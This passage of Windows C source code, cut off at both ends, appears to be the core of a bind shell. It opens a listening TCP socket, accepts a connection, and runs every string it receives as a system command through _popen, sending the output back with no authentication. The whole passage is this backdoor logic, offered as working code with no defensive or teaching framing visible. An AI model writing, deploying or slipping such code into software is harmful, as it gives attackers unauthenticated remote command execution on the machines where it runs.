    char buffer[BUFSIZE];

    // Create a socket for listening
    if ((listenSocket = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
        printf("Error: Unable to create socket\n");
        return 1;
    }

    // Set up the server address
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(PORT);

    // Bind the socket
    if (bind(listenSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        printf("Error: Bind failed with error %d\n", WSAGetLastError());
        closesocket(listenSocket);
        return 1;
    }

    // Start listening for incoming connections
    if (listen(listenSocket, SOMAXCONN) == SOCKET_ERROR) {
        printf("Error: Listen failed with error %d\n", WSAGetLastError());
        closesocket(listenSocket);
        return 1;
    }

    printf("Server is listening on port %d...\n", PORT);

    // Accept a connection
    if ((clientSocket = accept(listenSocket, (struct sockaddr*)&clientAddr, &addrSize)) == INVALID_SOCKET) {
        printf("Error: Accept failed with error %d\n", WSAGetLastError());
        closesocket(listenSocket);
        return 1;
    }

    printf("Connection accepted from %s:%d\n", inet_ntoa(clientAddr.sin_addr), ntohs(clientAddr.sin_port));

    // Execute command shell through the connected socket
    while (TRUE) {
        // Receive command from the client
        memset(buffer, 0, BUFSIZE);
        int bytesReceived = recv(clientSocket, buffer, BUFSIZE - 1, 0);
        if (bytesReceived > 0) {
            buffer[bytesReceived] = '\0';
            printf("Command received: %s\n", buffer);

            // Execute the command
            FILE* pipe = _popen(buffer, "r");
            if (!pipe) {
                printf("Failed to execute command\n");
                continue;
            }

            char result[4096];
            fread(result, 1, sizeof(result), pipe);
            fclose(pipe);

            // Send the output back to the client
            send(clientSocket, result, strlen(result), 0);
        } else {
            break; // Connection closed by the client
        }
    }

    closesocket(clientSocket);
    closesocket(listenSocket);
